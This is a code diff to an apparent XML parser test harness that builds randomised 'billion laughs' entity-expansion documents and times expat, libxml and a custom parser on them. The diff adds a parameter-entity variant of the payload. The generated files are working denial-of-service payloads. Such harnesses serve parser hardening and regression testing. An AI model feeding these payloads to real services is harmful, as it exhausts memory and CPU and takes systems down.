@@ -33,15 +33,31 @@ for _ in range(int(args.runs)):
     multi = getrn()
     depth = getrn()
     count = getrn() + 1
+    use_parameter_entities = bool(secrets.randbelow(2))
 
     exploit = "<!DOCTYPE billion [\n"
 
-    lolstring = "l" * length
-    entitydef = [f'<!ENTITY a0 "{lolstring}">\n']
+    if use_parameter_entities:
+        comment_left = "<!--"
+        comment_right = "-->"
+        comment_min_len = len(comment_left) + len(comment_right)
+        if length >= comment_min_len:
+            lolstring = comment_left + ("x" * (length - comment_min_len)) + comment_right
+        else:
+            lolstring = " " * length
+        entitydef = [f'<!ENTITY % a0 "{lolstring}">\n']
+    else:
+        lolstring = "l" * length
+        entitydef = [f'<!ENTITY a0 "{lolstring}">\n']
 
-    for j in range(depth):
-        entities = f"&a{j};" * multi
-        entitydef.append(f'<!ENTITY a{j + 1} "{entities}">')
+    if use_parameter_entities:
+        for j in range(depth):
+            entities = f"&#37;a{j};" * multi
+            entitydef.append(f'<!ENTITY % a{j + 1} "{entities}">')
+    else:
+        for j in range(depth):
+            entities = f"&a{j};" * multi
+            entitydef.append(f'<!ENTITY a{j + 1} "{entities}">')
 
     if args.flip:
         entitydef = "\n".join(reversed(entitydef))
@@ -53,7 +69,10 @@ for _ in range(int(args.runs)):
 
     exploit += entitydef
 
-    exploit += "]><x>" + (f"&a{depth};" * count) + "</x>\n"
+    if use_parameter_entities:
+        exploit += "\n" + (f"%a{depth};" * count) + "\n]><x/>\n"
+    else:
+        exploit += "]><x>" + (f"&a{depth};" * count) + "</x>\n"
 
     start = int(time.time())
 
@@ -61,7 +80,7 @@ for _ in range(int(args.runs)):
     pathlib.Path(fn).write_text(exploit)
 
     if args.mode == "expat":
-        cmd = ["xmlwf", fn]
+        cmd = ["xmlwf", "-p", fn]
     elif args.mode == "libxml":
         cmd = ["xmllint", "--noent", fn]
     elif args.mode == "custom":
